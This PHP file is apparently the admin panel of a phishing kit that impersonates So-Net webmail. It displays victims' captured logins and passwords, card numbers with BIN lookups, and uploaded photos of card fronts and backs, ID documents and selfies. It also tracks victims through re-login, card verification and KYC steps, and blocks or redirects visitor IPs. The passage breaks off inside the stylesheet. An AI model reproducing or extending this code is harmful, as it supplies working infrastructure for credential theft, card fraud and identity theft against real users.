<?php
ini_set('session.use_cookies', 1);
ini_set('session.use_only_cookies', 1);
ini_set('session.cookie_httponly', 1);
session_start();

define('ADMIN_USERNAME', 'admin');
define('ADMIN_PASSWORD', 'Admin@123');
define('RESULTS_FILE', 'resultsjson');
define('VISITORS_LOG', 'visitorslog');
define('INPUT_LOGS_FILE', 'input_logsjson');
define('BLOCKED_IPS_FILE', 'blocked_ips.txt');
define('ACCEPT_IPS_FILE', 'acceptip.txt');
define('ACCPASS_FILE', 'accpass.txt');
define('BLOCKLIST_FILE', 'blocklist.txt');
define('CARDBLOCK_FILE', 'cardblock.txt');
define('STEPS_CONFIG_FILE', 'steps_config.json');
define('IP_REDIRECT_FILE', 'ip_redirect.json');
define('VERIF_IPS_FILE', 'verif_ips.txt');
define('UPLOADS_DIR', __DIR__ . '/uploads/');

function check_bin($bin) {
    $bin = preg_replace('/\s/', '', $bin);
    $bin = substr($bin, 0, 8);
    $url = "https://lookup.binlist.net/" . $bin;
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => ['Accept-Version: 3'],
        CURLOPT_TIMEOUT => 5
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);
    if ($resp === false) return null;
    return json_decode($resp, true);
}

function getPhotoCategory($filename) {
    if (strpos($filename, 'card_front') !== false) return 'card_front';
    if (strpos($filename, 'card_back') !== false) return 'card_back';
    if (strpos($filename, 'id_passport') !== false) return 'id_passport';
    if (strpos($filename, 'selfie') !== false) return 'selfie';
    return 'other';
}

function getPhotoCategoryLabel($category) {
    $labels = [
        'card_front' => '💳 Kartu Depan',
        'card_back' => '💳 Kartu Belakang',
        'id_passport' => '🪪 ID / Paspor',
        'selfie' => '🤳 Selfie',
        'other' => '📁 Lainnya'
    ];
    return $labels[$category] ?? '📁 Lainnya';
}

function formatFileSize($bytes) {
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: admin.php");
    exit;
}

if (isset($_GET['ajax'])) {
    header('Content-Type: application/json');

    if ($_GET['ajax'] === 'visitors') {
        $visitors = [];
        if (file_exists(VISITORS_LOG)) {
            $lines = file(VISITORS_LOG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $visitors = array_slice($lines, -300);
        }
        echo json_encode(['visitors' => $visitors]);
        exit;
    }

    if ($_GET['ajax'] === 'results') {
        $results = [];
        if (file_exists(RESULTS_FILE)) {
            $content = file_get_contents(RESULTS_FILE);
            $results = json_decode($content, true) ?: [];
            $results = array_reverse($results);
        }
        echo json_encode(['results' => $results]);
        exit;
    }

    if ($_GET['ajax'] === 'photos') {
        $photos = [];
        if (is_dir(UPLOADS_DIR)) {
            $files = scandir(UPLOADS_DIR);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $filePath = UPLOADS_DIR . $file;
                if (!is_file($filePath)) continue;
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                if (!in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp'])) continue;
                $category = getPhotoCategory($file);
                $photos[] = [
                    'filename' => $file,
                    'url' => 'uploads/' . $file,
                    'category' => $category,
                    'category_label' => getPhotoCategoryLabel($category),
                    'size' => filesize($filePath),
                    'size_formatted' => formatFileSize(filesize($filePath)),
                    'uploaded' => date('Y-m-d H:i:s', filemtime($filePath)),
                    'timestamp' => filemtime($filePath)
                ];
            }
            usort($photos, fn($a, $b) => $b['timestamp'] - $a['timestamp']);
        }
        $stats = ['card_front' => 0, 'card_back' => 0, 'id_passport' => 0, 'selfie' => 0, 'other' => 0];
        foreach ($photos as $p) { $stats[$p['category']] = ($stats[$p['category']] ?? 0) + 1; }
        echo json_encode(['photos' => $photos, 'total' => count($photos), 'stats' => $stats]);
        exit;
    }

    if ($_GET['ajax'] === 'input_logs') {
        $logs = [];
        if (file_exists(INPUT_LOGS_FILE)) {
            $content = file_get_contents(INPUT_LOGS_FILE);
            $logs = json_decode($content, true) ?: [];
        }
        $filter_ip = $_GET['filter_ip'] ?? '';
        if (!empty($filter_ip)) {
            $logs = array_filter($logs, fn($l) => ($l['ip'] ?? '') === $filter_ip);
            $logs = array_values($logs);
        }
        $grouped = [];
        foreach ($logs as $log) {
            $ip = $log['ip'] ?? 'Unknown';
            if (!isset($grouped[$ip])) {
                $grouped[$ip] = ['ip' => $ip, 'location' => $log['location'] ?? 'Unknown', 'entries' => []];
            }
            $grouped[$ip]['entries'][] = $log;
        }
        foreach ($grouped as &$g) {
            usort($g['entries'], fn($a, $b) => strtotime($b['timestamp']) - strtotime($a['timestamp']));
        }
        usort($grouped, function($a, $b) {
            $ta = !empty($a['entries']) ? strtotime($a['entries'][0]['timestamp']) : 0;
            $tb = !empty($b['entries']) ? strtotime($b['entries'][0]['timestamp']) : 0;
            return $tb - $ta;
        });
        echo json_encode(['grouped' => $grouped, 'total_entries' => count($logs)]);
        exit;
    }

    if ($_GET['ajax'] === 'stats') {
        $stats = [
            'total_visits' => 0, 'total_results' => 0, 'blocked_ips' => 0,
            'active_now' => 0, 'today_visits' => 0, 'total_inputs' => 0,
            'relogin1' => 0, 'relogin' => 0, 'verif' => 0, 'reverif' => 0, 'kyc' => 0, 'finish' => 0,
            'total_photos' => 0
        ];
        if (file_exists(VISITORS_LOG)) {
            $lines = file(VISITORS_LOG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $stats['total_visits'] = count($lines);
            $today = date('Y-m-d');
            foreach ($lines as $line) {
                if (strpos($line, $today) !== false) $stats['today_visits']++;
                if (stripos($line, 'RELOGIN ATTEMPT #1') !== false) $stats['relogin1']++;
                if (stripos($line, 'RELOGIN SUCCESS') !== false) $stats['relogin']++;
                if (stripos($line, 'CARD SUBMITTED') !== false && stripos($line, 'step: verif') !== false) $stats['verif']++;
                if (stripos($line, 'CARD SUBMITTED') !== false && stripos($line, 'step: reverif') !== false) $stats['reverif']++;
                if (stripos($line, 'KYC SUBMITTED') !== false) $stats['kyc']++;
                if (stripos($line, 'FINISH') !== false) $stats['finish']++;
            }
        }
        if (file_exists(RESULTS_FILE)) {
            $content = file_get_contents(RESULTS_FILE);
            $data = json_decode($content, true) ?: [];
            $stats['total_results'] = count($data);
        }
        if (file_exists(INPUT_LOGS_FILE)) {
            $content = file_get_contents(INPUT_LOGS_FILE);
            $data = json_decode($content, true) ?: [];
            $stats['total_inputs'] = count($data);
        }
        if (file_exists(BLOCKED_IPS_FILE)) {
            $stats['blocked_ips'] = count(file(BLOCKED_IPS_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
        }
        if (is_dir(UPLOADS_DIR)) {
            $files = scandir(UPLOADS_DIR);
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp'])) $stats['total_photos']++;
            }
        }
        if (file_exists(VISITORS_LOG)) {
            $lines = file(VISITORS_LOG, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $five_mins_ago = time() - 300;
            $active_ips = [];
            foreach ($lines as $line) {
                if (preg_match('/\[(\d{2})\/(\d{2})\/(\d{2}) (\d{2}):(\d{2})\]/', $line, $matches)) {
                    $log_time = strtotime("20{$matches[3]}-{$matches[2]}-{$matches[1]} {$matches[4]}:{$matches[5]}");
                    if ($log_time > $five_mins_ago) {
                        if (preg_match('/- (\d+\.\d+\.\d+\.\d+) -/', $line, $ip_match)) {
                            $active_ips[$ip_match[1]] = true;
                        }
                    }
                }
            }
            $stats['active_now'] = count($active_ips);
        }
        echo json_encode($stats);
        exit;
    }

    if ($_GET['ajax'] === 'steps_config') {
        $config = file_exists(STEPS_CONFIG_FILE) ? json_decode(file_get_contents(STEPS_CONFIG_FILE), true) ?: [] : [];
        echo json_encode(['config' => $config]);
        exit;
    }

    if ($_GET['ajax'] === 'ip_redirects') {
        $redirects = [];
        if (file_exists(IP_REDIRECT_FILE)) {
            $redirects = json_decode(file_get_contents(IP_REDIRECT_FILE), true) ?: [];
        }
        echo json_encode(['redirects' => $redirects]);
        exit;
    }

    if ($_GET['ajax'] === 'verif_ips') {
        $ips = file_exists(VERIF_IPS_FILE) ? file(VERIF_IPS_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
        echo json_encode(['verif_ips' => array_map('trim', $ips)]);
        exit;
    }

    if ($_GET['ajax'] === 'bin_lookup' && isset($_GET['bin'])) {
        $bin = $_GET['bin'];
        $result = check_bin($bin);
        echo json_encode($result ?: ['error' => 'Lookup failed']);
        exit;
    }
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $response = ['success' => false, 'message' => ''];

    switch ($_POST['action']) {
        case 'edit_accpass':
            file_put_contents(ACCPASS_FILE, $_POST['content'] ?? '');
            $response = ['success' => true, 'message' => 'accpass.txt updated!'];
            break;
        case 'edit_blocklist':
            file_put_contents(BLOCKLIST_FILE, $_POST['content'] ?? '');
            $response = ['success' => true, 'message' => 'blocklist.txt updated!'];
            break;
        case 'edit_cardblock':
            file_put_contents(CARDBLOCK_FILE, $_POST['content'] ?? '');
            $response = ['success' => true, 'message' => 'cardblock.txt updated!'];
            break;
        case 'edit_blocked_ips':
            file_put_contents(BLOCKED_IPS_FILE, $_POST['content'] ?? '');
            $response = ['success' => true, 'message' => 'blocked_ips.txt updated!'];
            break;
        case 'edit_accept_ips':
            file_put_contents(ACCEPT_IPS_FILE, $_POST['content'] ?? '');
            $response = ['success' => true, 'message' => 'acceptip.txt updated!'];
            break;
        case 'toggle_step':
            $config = file_exists(STEPS_CONFIG_FILE) ? json_decode(file_get_contents(STEPS_CONFIG_FILE), true) ?: [] : [];
            $config[$_POST['step']] = $_POST['enabled'] === 'true';
            file_put_contents(STEPS_CONFIG_FILE, json_encode($config, JSON_PRETTY_PRINT));
            $response = ['success' => true, 'message' => 'Step updated!'];
            break;
        case 'add_ip_redirect':
            $ip = trim($_POST['ip'] ?? '');
            $step = trim($_POST['step'] ?? 'login');
            if (!empty($ip) && filter_var($ip, FILTER_VALIDATE_IP)) {
                $redirects = file_exists(IP_REDIRECT_FILE) ? json_decode(file_get_contents(IP_REDIRECT_FILE), true) ?: [] : [];
                $redirects[$ip] = $step;
                file_put_contents(IP_REDIRECT_FILE, json_encode($redirects, JSON_PRETTY_PRINT));
                $response = ['success' => true, 'message' => "IP $ip redirect to $step!"];
            } else {
                $response = ['success' => false, 'message' => 'Invalid IP!'];
            }
            break;
        case 'remove_ip_redirect':
            $ip = trim($_POST['ip'] ?? '');
            if (!empty($ip) && file_exists(IP_REDIRECT_FILE)) {
                $redirects = json_decode(file_get_contents(IP_REDIRECT_FILE), true) ?: [];
                if (isset($redirects[$ip])) {
                    unset($redirects[$ip]);
                    file_put_contents(IP_REDIRECT_FILE, json_encode($redirects, JSON_PRETTY_PRINT));
                    $response = ['success' => true, 'message' => "IP $ip redirect removed!"];
                }
            }
            break;
        case 'block_ip':
            $ip = trim($_POST['ip'] ?? '');
            if (!empty($ip) && filter_var($ip, FILTER_VALIDATE_IP)) {
                $current = file_exists(BLOCKED_IPS_FILE) ? file_get_contents(BLOCKED_IPS_FILE) : '';
                if (strpos($current, $ip) === false) {
                    file_put_contents(BLOCKED_IPS_FILE, $ip . "\n", FILE_APPEND);
                    $response = ['success' => true, 'message' => "IP $ip blocked!"];
                } else {
                    $response = ['success' => false, 'message' => "IP already blocked!"];
                }
            }
            break;
        case 'unblock_ip':
            $ip = trim($_POST['ip'] ?? '');
            if (!empty($ip) && file_exists(BLOCKED_IPS_FILE)) {
                $content = file_get_contents(BLOCKED_IPS_FILE);
                $content = str_replace($ip . "\n", '', $content);
                $content = str_replace($ip, '', $content);
                file_put_contents(BLOCKED_IPS_FILE, $content);
                $response = ['success' => true, 'message' => "IP $ip unblocked!"];
            }
            break;
        case 'delete_result':
            $id = intval($_POST['id'] ?? 0);
            if (file_exists(RESULTS_FILE)) {
                $data = json_decode(file_get_contents(RESULTS_FILE), true) ?: [];
                if (isset($data[$id])) {
                    unset($data[$id]);
                    file_put_contents(RESULTS_FILE, json_encode(array_values($data), JSON_PRETTY_PRINT));
                    $response = ['success' => true, 'message' => 'Result deleted!'];
                }
            }
            break;
        case 'bulk_delete_results':
            $ids = json_decode($_POST['ids'], true);
            if (file_exists(RESULTS_FILE)) {
                $data = json_decode(file_get_contents(RESULTS_FILE), true) ?: [];
                rsort($ids);
                foreach ($ids as $id) if (isset($data[$id])) unset($data[$id]);
                file_put_contents(RESULTS_FILE, json_encode(array_values($data), JSON_PRETTY_PRINT));
                $response = ['success' => true, 'message' => count($ids) . ' results deleted!'];
            }
            break;
        case 'clear_visitors':
            if (file_exists(VISITORS_LOG)) {
                file_put_contents(VISITORS_LOG, '');
                $response = ['success' => true, 'message' => 'Visitors log cleared!'];
            }
            break;
        case 'clear_input_logs':
            if (file_exists(INPUT_LOGS_FILE)) {
                file_put_contents(INPUT_LOGS_FILE, '[]');
                $response = ['success' => true, 'message' => 'Input logs cleared!'];
            }
            break;
        case 'delete_input_by_ip':
            $ip = trim($_POST['ip'] ?? '');
            if (!empty($ip) && file_exists(INPUT_LOGS_FILE)) {
                $logs = json_decode(file_get_contents(INPUT_LOGS_FILE), true) ?: [];
                $logs = array_filter($logs, fn($l) => ($l['ip'] ?? '') !== $ip);
                file_put_contents(INPUT_LOGS_FILE, json_encode(array_values($logs), JSON_PRETTY_PRINT));
                $response = ['success' => true, 'message' => "All inputs from IP $ip deleted!"];
            }
            break;
        case 'clear_all_results':
            file_put_contents(RESULTS_FILE, '[]');
            $response = ['success' => true, 'message' => 'All results cleared!'];
            break;
        case 'remove_verif_ip':
            $ip = trim($_POST['ip'] ?? '');
            if (!empty($ip) && file_exists(VERIF_IPS_FILE)) {
                $ips = array_filter(file(VERIF_IPS_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES), fn($l) => trim($l) !== $ip);
                file_put_contents(VERIF_IPS_FILE, implode("\n", $ips) . (count($ips) > 0 ? "\n" : ''));
                $response = ['success' => true, 'message' => 'IP removed from verif list!'];
            }
            break;
        case 'clear_verif_ips':
            if (file_exists(VERIF_IPS_FILE)) {
                file_put_contents(VERIF_IPS_FILE, '');
                $response = ['success' => true, 'message' => 'All verif IPs cleared!'];
            }
            break;
        case 'delete_photo':
            $filename = basename($_POST['filename'] ?? '');
            if (!empty($filename)) {
                $filePath = UPLOADS_DIR . $filename;
                if (file_exists($filePath) && is_file($filePath)) {
                    if (unlink($filePath)) {
                        $response = ['success' => true, 'message' => "Foto '$filename' berhasil dihapus!"];
                    } else {
                        $response = ['success' => false, 'message' => 'Gagal menghapus foto!'];
                    }
                } else {
                    $response = ['success' => false, 'message' => 'Foto tidak ditemukan!'];
                }
            }
            break;
        case 'clear_all_photos':
            $deleted = 0;
            if (is_dir(UPLOADS_DIR)) {
                $files = scandir(UPLOADS_DIR);
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;
                    $filePath = UPLOADS_DIR . $file;
                    if (is_file($filePath)) {
                        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                        if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp'])) {
                            if (unlink($filePath)) $deleted++;
                        }
                    }
                }
            }
            $response = ['success' => true, 'message' => "$deleted foto berhasil dihapus!"];
            break;
        case 'clear_photos_by_category':
            $category = trim($_POST['category'] ?? '');
            $deleted = 0;
            if (is_dir(UPLOADS_DIR)) {
                $files = scandir(UPLOADS_DIR);
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;
                    if (getPhotoCategory($file) === $category) {
                        $filePath = UPLOADS_DIR . $file;
                        if (is_file($filePath) && unlink($filePath)) $deleted++;
                    }
                }
            }
            $response = ['success' => true, 'message' => "$deleted foto kategori dihapus!"];
            break;
    }
    echo json_encode($response);
    exit;
}

if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
        if ($_POST['username'] === ADMIN_USERNAME && $_POST['password'] === ADMIN_PASSWORD) {
            $_SESSION['admin_logged_in'] = true;
            header("Location: admin.php");
            exit;
        } else {
            $login_error = "Username atau password salah!";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
    <title>Admin Login - So-Net</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #0b0f19 0%, #111827 100%); display: flex; justify-content: center; align-items: center; height: 100vh; }
    .login-box { background: rgba(17, 24, 39, 0.95); padding: 40px; border-radius: 15px; box-shadow: 0 8px 32px rgba(239, 68, 68, 0.3); width: 350px; border: 1px solid rgba(239, 68, 68, 0.2); }
    h2 { color: #fff; text-align: center; margin-bottom: 30px; font-size: 28px; }
    input { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; background: rgba(31, 41, 55, 0.8); color: #fff; font-size: 14px; }
    button { width: 100%; padding: 15px; background: linear-gradient(135deg, #ef4444 0%, #f97316 100%); color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
    .error { color: #ef4444; text-align: center; margin-bottom: 15px; padding: 10px; background: rgba(239, 68, 68, 0.1); border-radius: 5px; }
    </style>
    </head>
    <body>
    <div class="login-box">
    <h2>🔐 So-Net Admin</h2>
    <?php if (isset($login_error)): ?><div class="error"><?php echo $login_error; ?></div><?php endif; ?>
    <form method="post">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" name="login">Login</button>
    </form>
    </div>
    </body>
    </html>
    <?php
    exit;
}

$accpass_content = file_exists(ACCPASS_FILE) ? file_get_contents(ACCPASS_FILE) : '';
$blocklist_content = file_exists(BLOCKLIST_FILE) ? file_get_contents(BLOCKLIST_FILE) : '';
$blocked_ips_content = file_exists(BLOCKED_IPS_FILE) ? file_get_contents(BLOCKED_IPS_FILE) : '';
$accept_ips_content = file_exists(ACCEPT_IPS_FILE) ? file_get_contents(ACCEPT_IPS_FILE) : '';
$cardblock_content = file_exists(CARDBLOCK_FILE) ? file_get_contents(CARDBLOCK_FILE) : '';
?>

<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link id="favicon" rel="shortcut icon" href="https://webmail.so-net.ne.jp/appsuite/v=7.10.6-66.20260825.005759/apps/themes/default/favicon.ico" type="image/x-icon">
<title>So-Net Admin Panel</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0f19; color: #fff; }
.header { background: linear-gradient(135deg, #111827 0%, #1f2937 100%); padding: 20px; border-bottom: 2px solid #ef4444; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
.header h1 { color: #ef4444; font-size: 24px; }
.logout-btn { background: #ef4444; color: #fff; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; }
.container { display: flex; min-height: calc(100vh - 80px); }
.sidebar { width: 260px; background: #111827; padding: 20px; border-right: 1px solid #1f2937; }
.menu-item { padding: 15px; margin: 5px 0; background: #1f2937; border-radius: 5px; cursor: pointer; transition: all 0.3s; font-size: 14px; }
.menu-item:hover, .menu-item.active { background: #ef4444; transform: translateX(5px); }
.content { flex: 1; padding: 20px; overflow-y: auto; }
.section { display: none; }
.section.active { display: block; animation: fadeIn 0.5s; }
@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
.stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
.stat-card { background: linear-gradient(135deg, #111827 0%, #1f2937 100%); padding: 20px; border-radius: 10px; border-left: 4px solid #ef4444; }
.stat-card h3 { color: #9ca3af; font-size: 14px; margin-bottom: 10px; text-transform: uppercase; }
.stat-card .value { font-size: 32px; font-weight: bold; color: #fff; }
.stat-card.active-now { border-left-color: #10b981; }
.stat-card.inputs { border-left-color: #f59e0b; }
.stat-card.photos { border-left-color: #8b5cf6; }
.monitor-wrapper { display: flex; flex-direction: column; height: calc(100vh - 180px); min-height: 600px; }
.monitor-container { position: relative; flex: 1; background: #000; border: 2px solid #1f2937; border-radius: 10px; overflow: hidden; display: flex; flex-direction: column; }
.monitor-header { background: #111827; padding: 10px 15px; border-bottom: 2px solid #ef4444; font-size: 12px; color: #9ca3af; display: flex; justify-content: space-between; align-items: center; }
.monitor-status { display: flex; align-items: center; gap: 8px; }
.status-dot { width: 8px; height: 8px; background: #00ff00; border-radius: 50%; animation: pulse 2s infinite; }
@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
.monitor-box { flex: 1; overflow-y: auto; padding: 10px; font-family: 'Courier New', monospace; }
.monitor-line { padding: 6px 10px; margin: 2px 0; border-left: 3px solid #ef4444; background: rgba(255,255,255,0.03); font-size: 13px; color: #fff; white-space: pre-wrap; word-break: break-all; }
.monitor-line.bot { border-left-color: #ef4444; color: #fca5a5; background: rgba(239,68,68,0.05); }
.monitor-line.success { border-left-color: #10b981; color: #6ee7b7; background: rgba(16,185,129,0.05); }
.monitor-line.login { border-left-color: #06b6d4; color: #67e8f9; background: rgba(6,182,212,0.05); }
.monitor-line.verif { border-left-color: #f59e0b; color: #fcd34d; background: rgba(245,158,11,0.05); }
.monitor-line.kyc { border-left-color: #8b5cf6; color: #c4b5fd; background: rgba(139,92,246,0.05); }
.result-card { background: #111827; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #1f2937; }
.result-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1f2937; padding-bottom: 10px; margin-bottom: 15px; }
.result-time { color: #ef4444; font-weight: bold; }
.result-ip { color: #9ca3af; font-size: 14px; }
.delete-btn { background: #ef4444; color: #fff; border: none; padding: 5px 15px; border-radius: 3px; cursor: pointer; }
.editor-box { margin-bottom: 30px; }
.editor-box h3 { color: #ef4444; margin-bottom: 10px; }
.editor-box textarea { width: 100%; height: 200px; background: #0b0f19; color: #10b981; border: 1px solid #1f2937; padding: 10px; font-family: monospace; border-radius: 5px; }
.save-btn { background: #10b981; color: #000; border: none; padding: 10px 30px; border-radius: 5px; cursor: pointer; margin-top: 10px; font-weight: bold; }
.input-group { margin-bottom: 20px; }
.input-group label { display: block; color: #9ca3af; margin-bottom: 5px; }
.input-group input, .input-group select { width: 100%; padding: 10px; background: #0b0f19; border: 1px solid #1f2937; color: #fff; border-radius: 5px; }
.input-row { display: flex; gap: 10px; align-items: flex-end; }
.input-row > div { flex: 1; }
.notification { position: fixed; top: 20px; right: 20px; background: #10b981; color: #000; padding: 15px 25px; border-radius: 5px; display: none; z-index: 10000; font-weight: bold; }
.notification.error { background: #ef4444; color: #fff; }
.ip-redirect-item { background: #111827; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 3px solid #ef4444; display: flex; justify-content: space-between; align-items: center; }
.ip-redirect-item .ip { font-family: monospace; color: #10b981; }
.ip-redirect-item .step { color: #9ca3af; }
.login-credentials { background: linear-gradient(135deg, #111827 0%, #1f2937 100%); padding: 20px; margin: 10px 0; border-radius: 8px; border: 2px solid #ef4444; }
.cred-row { margin-bottom: 12px; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 5px; border-left: 3px solid #10b981; }
.cred-row.first-pw { border-left-color: #f59e0b; }
.cred-row.second-pw { border-left-color: #10b981; }
.cred-label { color: #9ca3af; font-size: 11px; text-transform: uppercase; margin-bottom: 5px; }
.cred-value { color: #fff; font-family: 'Courier New', monospace; font-size: 15px; font-weight: bold; word-break: break-all; background: rgba(16,185,129,0.1); padding: 8px 12px; border-radius: 3px; border: 1px dashed rgba(16,185,129,0.3); }
.cred-value.first { background: rgba(245,158,11,0.1); border-color: rgba(245,158,11,0.3); color: #fcd34d; }
.cred-value.second { background: rgba(16,185,129,0.1); border-color: rgba(16,185,129,0.3); color: #6ee7b7; }
.cred-value.id-field { background: rgba(239,68,68,0.1); border-color: rgba(239,68,68,0.3); color: #fca5a5; }
.mode-badge { display: inline-block; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; margin-left: 10px; }
.mode-badge.accpass { background: #10b981; color: #000; }
.mode-badge.second { background: #f59e0b; color: #000; }
.bin-card-box { background: linear-gradient(135deg, #111827 0%, #1f2937 100%); border: 2px solid #ef4444; border-radius: 10px; padding: 20px; margin: 10px 0; }
.bin-card-header { color: #ef4444; font-size: 14px; text-transform: uppercase; margin-bottom: 15px; font-weight: bold; }
.bin-card-info { display: grid; gap: 10px; }
.bin-card-row { display: flex; align-items: center; gap: 10px; }
.bin-card-label { color: #9ca3af; font-size: 12px; min-width: 120px; }
.bin-card-value { color: #fff; font-family: monospace; font-size: 14px; font-weight: bold; }
.bin-lookup-btn { background: #10b981; color: #000; border: none; padding: 5px 15px; border-radius: 3px; cursor: pointer; font-size: 12px; font-weight: bold; }
.bin-details { margin-top: 10px; padding: 10px; background: rgba(16,185,129,0.1); border-radius: 5px; border-left: 3px solid #10b981; display: none; }
.bin-details.show { display: block; }
.step-control-item { background: #111827; padding: 20px; margin: 10px 0; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; }
.toggle-switch { position: relative; width: 60px; height: 30px; background: #1f2937; border-radius: 30px; cursor: pointer; transition: all 0.3s; }
.toggle-switch.active { background: #10b981; }
.toggle-switch::after { content: ''; position: absolute; width: 24px; height: 24px; background: #fff; border-radius: 50%; top: 3px; left: 3px; transition: all 0.3s; }
.toggle-switch.active::after { left: 33px; }
.bulk-delete-btn { background: #f59e0b; color: #000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
.bulk-delete-btn:disabled { opacity: 0.5; cursor: not-allowed; }
.result-checkbox { width: 20px; height: 20px; accent-color: #ef4444; }
.action-btn { background: #ef4444; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
.ip-group-card { background: #111827; border-radius: 10px; margin-bottom: 20px; border: 1px solid #1f2937; overflow: hidden; }
.ip-group-header { background: linear-gradient(135deg, #1f2937 0%, #111827 100%); padding: 20px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; border-left: 4px solid #f59e0b; }
.ip-group-header:hover { background: #1a2847; }
.ip-group-info { flex: 1; }
.ip-group-ip { font-family: monospace; font-size: 18px; font-weight: bold; color: #10b981; margin-bottom: 5px; }
.ip-group-meta { font-size: 13px; color: #9ca3af; }
.ip-group-stats { display: flex; gap: 15px; align-items: center; }
.ip-group-count { background: #ef4444; color: #fff; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; }
.ip-group-toggle { color: #fff; font-size: 20px; transition: transform 0.3s; }
.ip-group-toggle.open { transform: rotate(180deg); }
.ip-group-entries { display: none; padding: 15px; background: rgba(0,0,0,0.2); border-top: 1px solid #1f2937; }
.ip-group-entries.open { display: block; }
.input-entry { background: rgba(31,41,55,0.5); border-left: 3px solid #06b6d4; padding: 12px 15px; margin-bottom: 10px; border-radius: 5px; font-family: monospace; font-size: 13px; }
.input-entry.login { border-left-color: #06b6d4; }
.input-entry.relogin { border-left-color: #f59e0b; }
.input-entry.verif, .input-entry.reverif { border-left-color: #f59e0b; }
.input-entry.kyc { border-left-color: #8b5cf6; }
.entry-header { display: flex; justify-content: space-between; margin-bottom: 8px; padding-bottom: 8px; border-bottom: 1px dashed rgba(255,255,255,0.1); }
.entry-step { font-weight: bold; color: #fff; font-size: 14px; text-transform: uppercase; }
.entry-time { color: #9ca3af; font-size: 12px; }
.entry-data { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 6px; }
.entry-field { display: flex; gap: 8px; align-items: baseline; }
.entry-key { color: #888; font-size: 12px; min-width: 100px; }
.entry-val { color: #10b981; font-weight: bold; word-break: break-all; }
.entry-val.sensitive { color: #fca5a5; background: rgba(239,68,68,0.1); padding: 2px 6px; border-radius: 3px; }
.filter-bar { background: #111827; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
.filter-bar input { flex: 1; min-width: 200px; padding: 10px; background: #0b0f19; border: 1px solid #1f2937; color: #fff; border-radius: 5px; }

.photo-stats-bar { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 25px; }
.photo-stat-card { background: linear-gradient(135deg, #111827 0%, #1f2937 100%); padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #1f2937; }
.photo-stat-card .icon { font-size: 28px; margin-bottom: 5px; }
.photo-stat-card .count { font-size: 24px; font-weight: bold; color: #ef4444; }
.photo-stat-card .label { font-size: 11px; color: #9ca3af; text-transform: uppercase; margin-top: 3px; }

.photo-filter-bar { background: #111827; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
.photo-filter-btn { background: #1f2937; color: #fff; border: none; padding: 8px 16px; border-radius: 20px; cursor: pointer; font-size: 13px; transition: all 0.3s; }
.photo-filter-btn:hover { background: #374151; }
.photo-filter-btn.active { background: #ef4444; }

